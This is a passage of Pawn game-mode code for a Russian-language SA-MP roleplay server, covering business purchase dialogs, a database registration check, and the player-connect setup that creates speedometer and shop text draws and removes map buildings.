			GetCena(GetPVarInt(playerid,"PBIZ"),650),GetCena(GetPVarInt(playerid,"PBIZ"),700),GetCena(GetPVarInt(playerid,"PBIZ"),2000),GetCena(GetPVarInt(playerid,"PBIZ"),6000),GetCena(GetPVarInt(playerid,"PBIZ"),6500)
			,GetCena(GetPVarInt(playerid,"PBIZ"),8000),GetCena(GetPVarInt(playerid,"PBIZ"),9500),GetCena(GetPVarInt(playerid,"PBIZ"),500),GetCena(GetPVarInt(playerid,"PBIZ"),1500));
			ShowPlayerDialog(playerid,158,DIALOG_STYLE_TABLIST,"Ammo",srrt,"Далее","Назад");*/
		}
		case 2:
		{


			query = "";
			if(BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4])
			{
			    format(str,sizeof(str),"Оплата\t%s\n",(!GetPVarInt(playerid,"Oplata")) ? ("{20BA09}[Наличные]") : ("{A8EFFF}[Карта]"));
				strcat(query,str);
			}
			for(new i = 0; i < MAX_PROD[GetPVarInt(playerid,"PBIZ")]; i++)
		    {
				format(str,sizeof(str),"%s\t{f7ae11}[%d$]{ffffff}\n",ProdNames[GetPVarInt(playerid,"PBIZ")][i],ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][i]);
				strcat(query,str);
	    	}
	    	ShowPlayerDialog(playerid,159,DIALOG_STYLE_TABLIST,"24/7",query,"Далее","Назад");
		}
		case 3:
		{
	        query = "";
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4])
			{
			    format(str,sizeof(str),"Оплата\t%s\n",(!GetPVarInt(playerid,"Oplata")) ? ("{20BA09}[Наличные]") : ("{A8EFFF}[Карта]"));
				strcat(query,str);
			}
			for(new i = 0; i < MAX_PROD[GetPVarInt(playerid,"PBIZ")]; i++)
		    {
				format(str,sizeof(str),"%s\t{f7ae11}[%d$]{ffffff}\n",ProdNames[GetPVarInt(playerid,"PBIZ")][i],ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][i]);
				strcat(query,str);
	    	}
			ShowPlayerDialog(playerid,160,DIALOG_STYLE_TABLIST,"Меню",query,"Далее","Назад");
		}
		case 4:
		{
			query = "";
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4])
			{
			    format(str,sizeof(str),"Оплата\t%s\n",(!GetPVarInt(playerid,"Oplata")) ? ("{20BA09}[Наличные]") : ("{A8EFFF}[Карта]"));
				strcat(query,str);
			}
			for(new i = 0; i < MAX_PROD[GetPVarInt(playerid,"PBIZ")]; i++)
		    {
				format(str,sizeof(str),"%s\t{f7ae11}[%d$]{ffffff}\n",ProdNames[GetPVarInt(playerid,"PBIZ")][i],ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][i]);
				strcat(query,str);
	    	}
			ShowPlayerDialog(playerid,182,DIALOG_STYLE_TABLIST,"Меню",query,"Далее","Назад");
		}
		case 8:
		{
			query = "";
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4])
			{
			    format(str,sizeof(str),"Оплата\t%s\n",(!GetPVarInt(playerid,"Oplata")) ? ("{20BA09}[Наличные]") : ("{A8EFFF}[Карта]"));
				strcat(query,str);
			}
			for(new i = 0; i < MAX_PROD[GetPVarInt(playerid,"PBIZ")]; i++)
		    {
				format(str,sizeof(str),"%s\t{f7ae11}[%d$]{ffffff}\n",ProdNames[GetPVarInt(playerid,"PBIZ")][i],ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][i]);
				strcat(query,str);
	    	}
			ShowPlayerDialog(playerid,181,DIALOG_STYLE_TABLIST,"Меню",query,"Далее","Назад");
		}
		case 5..7:
		{
	        query = "";
		    if(BizInfo[GetPVarInt(playerid,"PBIZ")][bUl][4])
			{
			    format(str,sizeof(str),"Оплата\t%s\n",(!GetPVarInt(playerid,"Oplata")) ? ("{20BA09}[Наличные]") : ("{A8EFFF}[Карта]"));
				strcat(query,str);
			}
			for(new i = 0; i < MAX_PROD[GetPVarInt(playerid,"PBIZ")]; i++)
		    {
				format(str,sizeof(str),"%s\t{f7ae11}[%d$]{ffffff}\n",ProdNames[GetPVarInt(playerid,"PBIZ")][i],ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][i]);
				strcat(query,str);
	    	}
			ShowPlayerDialog(playerid,162,DIALOG_STYLE_TABLIST,"Меню",query,"Далее","Назад");
		}
	//	case 9: ShowPlayerDialog(playerid,148,DIALOG_STYLE_MSGBOX,"Приём на работу","{FFFFFF}Хочешь устроить к нам на работу?","Да","Нет");
		case 10:
		{
			static const fmt_str1[] = "{FFFFFF}Вы хотите купить канистру?\nЦена: {f7ae11}$%i";
			new string1[sizeof(fmt_str1)+5];
			format(string1, sizeof(string1), fmt_str1,ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][0]*30);
			ShowPlayerDialog(playerid,97,DIALOG_STYLE_MSGBOX,"Покупка канистры",string1,"Да","Нет");
			SetPVarInt(playerid,"AmmoGun",1);
			SetPVarInt(playerid,"AmmoProd",30);
			SetPVarInt(playerid,"AmmoPrice",ProdInfo[GetPVarInt(playerid,"PBIZ")][prodCena][0]*30);
		}
		case 17:
		{
		    SetPVarInt(playerid,"ACS",1);
			SetPlayerPos(playerid,-1.1232,11.0499,1996.0859);
			SetPlayerFacingAngle(playerid,271.1932);
			SetPlayerCameraPos(playerid,-0.243667,11.121191,1996.784912);
			SetPlayerCameraLookAt(playerid,-1.236707,11.100506,1996.668945);
			SetPlayerVirtualWorld(playerid,playerid);
			TogglePlayerControllable(playerid, 0);
			for(new i = 0; i < 18; i++) TextDrawShowForPlayer(playerid,ObjectBuy[i]);
			for(new i = 0; i < 3; i++) PlayerTextDrawShow(playerid,ObjectBuyP[i][playerid]);
			SelectTextDraw(playerid, CGREY);
			SetPVarInt(playerid,"ACS1",1);
			DeletePVar(playerid,"ACS2");
			SetAcs(playerid);
		//	SetAttachToSkin(playerid,Shpka[GetPVarInt(playerid,"ACS2")][1],Shpka[GetPVarInt(playerid,"ACS2")][0]);
			static const fmt_str1[] = "$%i";
			new string1[sizeof(fmt_str1)+10];
			format(string1, sizeof(string1), fmt_str1, ItemsCost[0][0]);
			PlayerTextDrawSetString(playerid,ObjectBuyP[2][playerid],string1);
			PlayerTextDrawSetString(playerid,ObjectBuyP[1][playerid],"HEADPHONES");
			PlayerTextDrawSetString(playerid,ObjectBuyP[0][playerid],"HEADPHONES 1");
			GiveItem(playerid,ItemsId[0][0]);

		}
		case 11,15,16:
		{
		    switch(BizInfo[GetPVarInt(playerid,"PBIZ")][bType])
			{
			    case 11:
			    {
					SetPlayerPos(playerid,208.7114,-4.9991,1005.2109);
					SetPlayerFacingAngle(playerid,270.3410);
					SetPlayerCameraPos(playerid,211.923553,-4.916074,1006.211425);
					SetPlayerCameraLookAt(playerid,208.7114,-4.9991,1005.2109);
				}
				case 15:
			    {
					SetPlayerPos(playerid,180.3063,-88.0736,1002.0234);
					SetPlayerFacingAngle(playerid,91.2485);
					SetPlayerCameraPos(playerid,176.640487,-88.331634,1003.423828);
					SetPlayerCameraLookAt(playerid,180.3063,-88.0736,1002.0234);
				}
				case 16:
			    {
					SetPlayerPos(playerid,216.9281,-100.7856,1005.2578);
					SetPlayerFacingAngle(playerid,86.5977);
					SetPlayerCameraPos(playerid,213.668762,-100.649871,1005.758728);
					SetPlayerCameraLookAt(playerid,216.9281,-100.7856,1005.2578);
				}
			}
			SetPlayerArmedWeapon(playerid,0);
			SetPlayerVirtualWorld(playerid,playerid);
		//	ShowMenuForPlayer(BuyClothes, playerid);
			TogglePlayerControllable(playerid, 0);
			new str2[10];
            format(str2,sizeof(str2),"ID: %d", (PlayerInfo[playerid][pSex] == 1) ? (MenSkin[0][1]) : (WomenSkin[0][1]));
			PlayerTextDrawSetString(playerid,ObjectBuyP[1][playerid],str2);
    		SetPlayerSkin(playerid,(PlayerInfo[playerid][pSex] == 1) ? (MenSkin[0][1]) : (WomenSkin[0][1]));
            format(str2,sizeof(str2),"%d$", (PlayerInfo[playerid][pSex] == 1) ? (MenSkin[0][0]) : (WomenSkin[0][0]));
            PlayerTextDrawSetString(playerid,ObjectBuyP[2][playerid],str2);
            SetPVarInt(playerid,"BuySkin",1);
            DeletePVar(playerid,"SelectSkin");
            for(new x = 5; x < 18; x++) TextDrawShowForPlayer(playerid,ObjectBuy[x]);
            for(new x = 1; x < 3; x++) PlayerTextDrawShow(playerid,ObjectBuyP[x][playerid]);
			SelectTextDraw(playerid, CGREY);
		 /*   if(PlayerInfo[playerid][pSex] == 1)
			{
				SetPVarInt(playerid,"Sex",1);
				SetPlayerSkin(playerid,MenSkin[0][1]);
				PlayerTextDrawShow(playerid,PriceText);
				static const fmt_str1[] = "PRICE: ~r~$%i";
				new string1[sizeof(fmt_str1)+10];
				format(string1, sizeof(string1), fmt_str1, GetCena(GetPVarInt(playerid,"PBIZ"),MenSkin[0][0]));
				PlayerTextDrawSetString(playerid,PriceText,string1);
			}
			else
			{
				SetPVarInt(playerid,"Sex",2);
				SetPlayerSkin(playerid,WomenSkin[0][1]);
				PlayerTextDrawShow(playerid,PriceText);
				static const fmt_str1[] = "PRICE: ~r~$%i";
				new string1[sizeof(fmt_str1)+10];
				format(string1, sizeof(string1), fmt_str1, GetCena(GetPVarInt(playerid,"PBIZ"),WomenSkin[0][0]));
				PlayerTextDrawSetString(playerid,PriceText,string1);
			}*/
		}
		case 14: ShowPlayerDialog(playerid,183,DIALOG_STYLE_LIST,"Меню","{FFFFFF}Напитки\nЕда","Далее","Назад");
		case 12,13: ShowPlayerDialog(playerid,188,DIALOG_STYLE_LIST,"Отель","{FFFFFF}Арендовать комнату\nОплатить комнату\nОтказать от аренды комнаты","Далее","Назад");

	}
	return 1;
}
function CheckReg(playerid)
{
    if(cache_get_row_count(mysql) > 0)
    {
		printf("в базе");
	    static const fmt_str[] = "{FFFFFF}Ваш ник: {f7ae11}%s{FFFFFF}\n\n{FFFFFF}Вы зарегистрированы на сервере.\nВведите свой пароль, указанный при регистрации:";
	    new str1[sizeof(fmt_str)+MAX_PLAYER_NAME];
	    format(str1, sizeof(str1), fmt_str, PlayerInfo[playerid][pSendername]);
		ShowPlayerDialog(playerid, 2, DIALOG_STYLE_PASSWORD, "Авторизация", str1, "Войти","Отмена");
	}
	else
	{
	    printf("Не в базе");
	    static const fmt_str[] = "{FFFFFF}Добро пожаловать на сервер {f7ae11}Maryland Role Play!{FFFFFF}\nДля начала игры на нашем сервере, вам необходимо пройти регистрацию.\n\nВ строчку ниже введите пароль для вашего аккаунта.\nОн будет запрашиваться каждый раз, когда вы заходите на сервер.\n\n{F85A5A}- Пароль может состоять из русских и латинских символов\n- Пароль чувствителен к регистру\n- Длина пароля может быть от 5-ти до 16-ти символов";
		new str[sizeof(fmt_str)+MAX_PLAYER_NAME];
		format(str, sizeof(str), fmt_str);
		ShowPlayerDialog(playerid, 1, DIALOG_STYLE_INPUT, "Регистрация | Шаг [1/8]", str, "Далее","");
	}
}
public OnPlayerConnect(playerid)
{
	if(playerid == INVALID_PLAYER_ID)
	{
		printf("хуёвый ид %i",playerid);
		return Kick(playerid, FIX_FUNCTION, 1200);
	}
	//banner
	RemoveBuildingForPlayer(playerid, 620, 2367.601, -1706.289, 11.289, 0.250);
	RemoveBuildingForPlayer(playerid, 17876, 2393.062, -1677.523, 20.820, 0.250);

	//banner
	RemoveBuildingForPlayer(playerid, 5473, 2124.879, -1576.199, 20.945, 0.250);
	//ls-sf
	RemoveBuildingForPlayer(playerid, 17002, 52.890, -1532.030, 7.742, 0.250);
	RemoveBuildingForPlayer(playerid, 1283, 73.812, -1543.130, 7.531, 0.250);

	printf("chlen %d",playerid);
	Gambling[playerid] = G_STATE_NOT_GAMBLING;
	SlotTimer[playerid] = -1;
	EnablePlayerCameraTarget(playerid, 1);
	PlayerLogged[playerid] = false;
	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid,playername,MAX_PLAYER_NAME+1);
	format(PlayerInfo[playerid][pSendername],MAX_PLAYER_NAME,playername);
	
	RemoveBuildingForPlayer(playerid, 5164, 2838.1406, -2447.8438, 15.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 3724, 2838.1953, -2407.1406, 29.3125, 0.25);
    RemoveBuildingForPlayer(playerid, 5163, 2838.0391, -2532.7734, 17.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 5157, 2838.0391, -2532.7734, 17.0234, 0.25);


	
	ObjectBuyP[0][playerid] = CreatePlayerTextDraw(playerid, 313.833404, 408.392547, "table256"); // object name
	PlayerTextDrawLetterSize(playerid, ObjectBuyP[0][playerid], 0.143326, 1.089771);
	PlayerTextDrawTextSize(playerid, ObjectBuyP[0][playerid], 10.000000, 41.000000);
	PlayerTextDrawAlignment(playerid, ObjectBuyP[0][playerid], 2);
	PlayerTextDrawColor(playerid, ObjectBuyP[0][playerid], -36827905);
	PlayerTextDrawSetShadow(playerid, ObjectBuyP[0][playerid], 0);
	PlayerTextDrawSetOutline(playerid, ObjectBuyP[0][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, ObjectBuyP[0][playerid], 51);
	PlayerTextDrawFont(playerid, ObjectBuyP[0][playerid], 2);
	PlayerTextDrawSetProportional(playerid, ObjectBuyP[0][playerid], 1);

	ObjectBuyP[1][playerid] = CreatePlayerTextDraw(playerid, 313.833343, 426.229614, "qwertyuiopasdfg"); // text category
	PlayerTextDrawLetterSize(playerid, ObjectBuyP[1][playerid], 0.173994, 1.172736);
	PlayerTextDrawTextSize(playerid, ObjectBuyP[1][playerid], 10.000000, 41.000000);
	PlayerTextDrawAlignment(playerid, ObjectBuyP[1][playerid], 2);
	PlayerTextDrawColor(playerid, ObjectBuyP[1][playerid], 255);
	PlayerTextDrawSetShadow(playerid, ObjectBuyP[1][playerid], 0);
	PlayerTextDrawSetOutline(playerid, ObjectBuyP[1][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, ObjectBuyP[1][playerid], 51);
	PlayerTextDrawFont(playerid, ObjectBuyP[1][playerid], 2);
	PlayerTextDrawSetProportional(playerid, ObjectBuyP[1][playerid], 1);

	ObjectBuyP[2][playerid] = CreatePlayerTextDraw(playerid, 315.500000, 389.725769, "1000000$"); // box price
	PlayerTextDrawLetterSize(playerid, ObjectBuyP[2][playerid], 0.252660, 1.591699);
	PlayerTextDrawTextSize(playerid, ObjectBuyP[2][playerid], 10.000000, 41.000000);
	PlayerTextDrawAlignment(playerid, ObjectBuyP[2][playerid], 2);
	PlayerTextDrawColor(playerid, ObjectBuyP[2][playerid], -1);
	PlayerTextDrawSetShadow(playerid, ObjectBuyP[2][playerid], 0);
	PlayerTextDrawSetOutline(playerid, ObjectBuyP[2][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, ObjectBuyP[2][playerid], 51);
	PlayerTextDrawFont(playerid, ObjectBuyP[2][playerid], 2);
	PlayerTextDrawSetProportional(playerid, ObjectBuyP[2][playerid], 1);
	
	SpeedometrP[0][playerid] = CreatePlayerTextDraw(playerid, 547.666564, 418.040832, "LD_BEAT:chit"); // box doors
	PlayerTextDrawLetterSize(playerid, SpeedometrP[0][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SpeedometrP[0][playerid], 7.333323, 9.125879);
	PlayerTextDrawAlignment(playerid, SpeedometrP[0][playerid], 1);
	PlayerTextDrawColor(playerid, SpeedometrP[0][playerid], 815673087);
	PlayerTextDrawSetShadow(playerid, SpeedometrP[0][playerid], 0);
	PlayerTextDrawSetOutline(playerid, SpeedometrP[0][playerid], 0);
	PlayerTextDrawFont(playerid, SpeedometrP[0][playerid], 4);

	SpeedometrP[1][playerid] = CreatePlayerTextDraw(playerid, 532.000122, 377.918640, "210"); // box current speed (pl)
	PlayerTextDrawLetterSize(playerid, SpeedometrP[1][playerid], 0.535996, 2.744884);
	PlayerTextDrawAlignment(playerid, SpeedometrP[1][playerid], 2);
	PlayerTextDrawColor(playerid, SpeedometrP[1][playerid], -1);
	PlayerTextDrawUseBox(playerid, SpeedometrP[1][playerid], true);
	PlayerTextDrawBoxColor(playerid, SpeedometrP[1][playerid], 0);
	PlayerTextDrawSetShadow(playerid, SpeedometrP[1][playerid], 0);
	PlayerTextDrawSetOutline(playerid, SpeedometrP[1][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, SpeedometrP[1][playerid], 51);
	PlayerTextDrawFont(playerid, SpeedometrP[1][playerid], 1);
	PlayerTextDrawSetProportional(playerid, SpeedometrP[1][playerid], 1);

	SpeedometrP[2][playerid] = CreatePlayerTextDraw(playerid, 547.500061, 428.614898, "LD_BEAT:chit"); // box light
	PlayerTextDrawLetterSize(playerid, SpeedometrP[2][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SpeedometrP[2][playerid], 7.333323, 9.125879);
	PlayerTextDrawAlignment(playerid, SpeedometrP[2][playerid], 1);
	PlayerTextDrawColor(playerid, SpeedometrP[2][playerid], -516080129);
	PlayerTextDrawSetShadow(playerid, SpeedometrP[2][playerid], 0);
	PlayerTextDrawSetOutline(playerid, SpeedometrP[2][playerid], 0);
	PlayerTextDrawFont(playerid, SpeedometrP[2][playerid], 4);

	SpeedometrP[3][playerid] = CreatePlayerTextDraw(playerid, 547.666687, 407.285278, "LD_BEAT:chit"); // box engine
	PlayerTextDrawLetterSize(playerid, SpeedometrP[3][playerid], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, SpeedometrP[3][playerid], 7.333323, 9.125879);
	PlayerTextDrawAlignment(playerid, SpeedometrP[3][playerid], 1);
	PlayerTextDrawColor(playerid, SpeedometrP[3][playerid], 815673087);
	PlayerTextDrawSetShadow(playerid, SpeedometrP[3][playerid], 0);
	PlayerTextDrawSetOutline(playerid, SpeedometrP[3][playerid], 0);
	PlayerTextDrawFont(playerid, SpeedometrP[3][playerid], 4);

	SpeedometrP[4][playerid] = CreatePlayerTextDraw(playerid, 612.000122, 382.555633, "100%"); // box car hp
	PlayerTextDrawLetterSize(playerid, SpeedometrP[4][playerid], 0.364327, 1.865478);
	PlayerTextDrawAlignment(playerid, SpeedometrP[4][playerid], 2);
	PlayerTextDrawColor(playerid, SpeedometrP[4][playerid], -1);
	PlayerTextDrawUseBox(playerid, SpeedometrP[4][playerid], true);
	PlayerTextDrawBoxColor(playerid, SpeedometrP[4][playerid], 0);
	PlayerTextDrawSetShadow(playerid, SpeedometrP[4][playerid], 0);
	PlayerTextDrawSetOutline(playerid, SpeedometrP[4][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, SpeedometrP[4][playerid], 51);
	PlayerTextDrawFont(playerid, SpeedometrP[4][playerid], 1);
	PlayerTextDrawSetProportional(playerid, SpeedometrP[4][playerid], 1);

	SpeedometrP[5][playerid] = CreatePlayerTextDraw(playerid, 605.500183, 408.040740, "000005_km"); // box mileage
	PlayerTextDrawLetterSize(playerid, SpeedometrP[5][playerid], 0.229328, 1.272294);
	PlayerTextDrawAlignment(playerid, SpeedometrP[5][playerid], 2);
	PlayerTextDrawColor(playerid, SpeedometrP[5][playerid], -36827905);
	PlayerTextDrawUseBox(playerid, SpeedometrP[5][playerid], true);
	PlayerTextDrawBoxColor(playerid, SpeedometrP[5][playerid], 0);
	PlayerTextDrawSetShadow(playerid, SpeedometrP[5][playerid], 0);
	PlayerTextDrawSetOutline(playerid, SpeedometrP[5][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid, SpeedometrP[5][playerid], 51);
	PlayerTextDrawFont(playerid, SpeedometrP[5][playerid], 1);
	PlayerTextDrawSetProportional(playerid, SpeedometrP[5][playerid], 1);

	SpeedometrP[6][playerid] = CreatePlayerTextDraw(playerid,605.000183, 420.040740, "100L"); // BOX FUEL
	PlayerTextDrawLetterSize(playerid,SpeedometrP[6][playerid], 0.352993, 1.761775);
	PlayerTextDrawAlignment(playerid,SpeedometrP[6][playerid], 2);
	PlayerTextDrawColor(playerid,SpeedometrP[6][playerid], -1);
	PlayerTextDrawUseBox(playerid,SpeedometrP[6][playerid], true);
	PlayerTextDrawBoxColor(playerid,SpeedometrP[6][playerid], 0);
	PlayerTextDrawSetShadow(playerid,SpeedometrP[6][playerid], 0);
	PlayerTextDrawSetOutline(playerid,SpeedometrP[6][playerid], 0);
	PlayerTextDrawBackgroundColor(playerid,SpeedometrP[6][playerid], 51);
	PlayerTextDrawFont(playerid,SpeedometrP[6][playerid], 1);
	PlayerTextDrawSetProportional(playerid,SpeedometrP[6][playerid], 1);
	
	//shahta
	RemoveBuildingForPlayer(playerid, 17351, -1432.546, -1545.867, 108.531, 0.250);
	RemoveBuildingForPlayer(playerid, 17352, -1458.093, -1499.781, 100.632, 0.250);
	RemoveBuildingForPlayer(playerid, 17353, -1423.585, -1490.476, 100.656, 0.250);
	RemoveBuildingForPlayer(playerid, 17354, -1458.453, -1522.632, 100.750, 0.250);
	RemoveBuildingForPlayer(playerid, 17355, -1440.812, -1460.109, 100.632, 0.250);
	RemoveBuildingForPlayer(playerid, 17356, -1447.718, -1576.734, 100.742, 0.250);
	RemoveBuildingForPlayer(playerid, 17051, -1426.765, -1594.484, 100.750, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1427.851, -1600.085, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1439.265, -1600.335, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1451.101, -1599.601, 101.554, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1462.648, -1599.203, 101.632, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1420.656, -1594.031, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1468.476, -1593.062, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3425, -1456.953, -1592.500, 112.125, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1417.796, -1583.031, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1468.976, -1581.484, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1470.742, -1535.773, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1471.703, -1524.742, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1469.242, -1569.812, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1469.625, -1558.257, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1470.000, -1546.976, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 17053, -1458.453, -1522.632, 100.750, 0.250);
	RemoveBuildingForPlayer(playerid, 17056, -1462.015, -1532.531, 101.906, 0.250);
	RemoveBuildingForPlayer(playerid, 17057, -1451.531, -1569.609, 100.742, 0.250);
	RemoveBuildingForPlayer(playerid, 17059, -1458.765, -1535.570, 100.750, 0.250);
	RemoveBuildingForPlayer(playerid, 17058, -1447.718, -1576.734, 100.742, 0.250);
	RemoveBuildingForPlayer(playerid, 17335, -1432.546, -1545.867, 108.531, 0.250);
	RemoveBuildingForPlayer(playerid, 1501, -1437.890, -1545.234, 101.281, 0.250);
	RemoveBuildingForPlayer(playerid, 17050, -1411.218, -1530.554, 100.750, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1411.164, -1561.101, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1414.601, -1572.093, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1403.171, -1528.835, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1402.671, -1540.203, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1406.421, -1550.843, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 17049, -1412.843, -1520.398, 100.750, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1405.382, -1517.046, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3425, -1439.789, -1520.937, 112.125, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1407.593, -1505.718, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1472.453, -1513.156, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 17052, -1458.093, -1499.781, 100.632, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1409.492, -1494.242, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1472.054, -1501.328, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3374, -1435.148, -1499.289, 102.164, 0.250);
	RemoveBuildingForPlayer(playerid, 17061, -1423.585, -1490.476, 100.656, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1470.531, -1489.890, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3374, -1435.203, -1490.515, 102.164, 0.250);
	RemoveBuildingForPlayer(playerid, 17060, -1457.687, -1485.757, 100.632, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1411.007, -1482.796, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1468.265, -1478.320, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1467.546, -1467.242, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1468.218, -1455.687, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 17054, -1440.812, -1460.109, 100.632, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1411.953, -1461.757, 101.039, 0.250);
	RemoveBuildingForPlayer(playerid, 3374, -1419.101, -1454.367, 102.101, 0.250);
	RemoveBuildingForPlayer(playerid, 3374, -1423.578, -1460.718, 102.164, 0.250);
	RemoveBuildingForPlayer(playerid, 17055, -1439.242, -1446.656, 102.929, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1412.265, -1450.226, 101.039, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1463.429, -1447.640, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3374, -1427.265, -1453.773, 102.101, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1452.960, -1443.351, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1441.460, -1440.789, 101.484, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1417.976, -1443.679, 100.796, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1429.531, -1441.820, 101.039, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1410.562, -1422.718, 105.062, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1421.648, -1420.164, 103.796, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1431.546, -1414.351, 102.757, 0.250);
	RemoveBuildingForPlayer(playerid, 3276, -1399.406, -1422.289, 106.164, 0.250);

	//ash
	RemoveBuildingForPlayer(playerid, 8136, 1038.226, 1263.953, 14.687, 0.250);
	RemoveBuildingForPlayer(playerid, 8138, 1038.226, 1263.953, 14.687, 0.250);
	RemoveBuildingForPlayer(playerid, 8228, 1097.390, 1293.226, 12.484, 0.250);
	RemoveBuildingForPlayer(playerid, 8229, 1142.031, 1362.500, 12.484, 0.250);
	RemoveBuildingForPlayer(playerid, 8232, 1097.390, 1293.164, 9.742, 0.250);
	RemoveBuildingForPlayer(playerid, 8233, 1097.390, 1293.164, 9.742, 0.250);
	RemoveBuildingForPlayer(playerid, 8234, 1097.390, 1293.226, 12.484, 0.250);
	RemoveBuildingForPlayer(playerid, 8235, 1166.718, 1354.210, 11.781, 0.250);
	RemoveBuildingForPlayer(playerid, 1257, 1084.531, 1200.007, 11.054, 0.250);
	RemoveBuildingForPlayer(playerid, 1346, 1098.398, 1201.984, 11.171, 0.250);
	RemoveBuildingForPlayer(playerid, 1346, 1097.093, 1201.984, 11.171, 0.250);
	RemoveBuildingForPlayer(playerid, 1278, 1099.265, 1243.312, 23.937, 0.250);
	RemoveBuildingForPlayer(playerid, 1278, 1099.265, 1283.343, 23.937, 0.250);
	RemoveBuildingForPlayer(playerid, 1278, 1031.921, 1323.335, 23.937, 0.250);
	RemoveBuildingForPlayer(playerid, 1341, 1030.593, 1362.593, 10.812, 0.250);
	RemoveBuildingForPlayer(playerid, 1278, 1038.539, 1361.226, 23.937, 0.250);
	RemoveBuildingForPlayer(playerid, 1256, 1036.976, 1357.625, 10.476, 0.250);
	RemoveBuildingForPlayer(playerid, 1278, 1098.859, 1361.226, 23.937, 0.250);
	RemoveBuildingForPlayer(playerid, 1278, 1099.265, 1323.335, 23.937, 0.250);
	RemoveBuildingForPlayer(playerid, 1278, 1117.281, 1204.710, 23.937, 0.250);
	RemoveBuildingForPlayer(playerid, 1278, 1136.976, 1204.710, 23.937, 0.250);
	RemoveBuildingForPlayer(playerid, 1300, 1157.843, 1204.945, 10.171, 0.250);
	RemoveBuildingForPlayer(playerid, 1368, 1157.804, 1206.976, 10.507, 0.250);
	RemoveBuildingForPlayer(playerid, 1368, 1157.804, 1211.437, 10.507, 0.250);
	RemoveBuildingForPlayer(playerid, 1368, 1157.804, 1216.343, 10.507, 0.250);
	RemoveBuildingForPlayer(playerid, 1300, 1157.843, 1218.468, 10.171, 0.250);
	RemoveBuildingForPlayer(playerid, 1258, 1116.156, 1363.601, 10.429, 0.250);
	RemoveBuildingForPlayer(playerid, 1278, 1157.015, 1361.226, 23.937, 0.250);
	RemoveBuildingForPlayer(playerid, 1368, 1165.171, 1222.804, 10.507, 0.250);
	RemoveBuildingForPlayer(playerid, 1368, 1169.625, 1222.804, 10.507, 0.250);
	RemoveBuildingForPlayer(playerid, 1300, 1163.031, 1222.796, 10.171, 0.250);
	RemoveBuildingForPlayer(playerid, 1412, 1166.796, 1223.203, 14.109, 0.250);
	RemoveBuildingForPlayer(playerid, 1412, 1161.515, 1223.203, 14.101, 0.250);
	RemoveBuildingForPlayer(playerid, 8231, 1166.640, 1354.203, 11.625, 0.250);
	RemoveBuildingForPlayer(playerid, 8230, 1166.718, 1354.210, 11.781, 0.250);
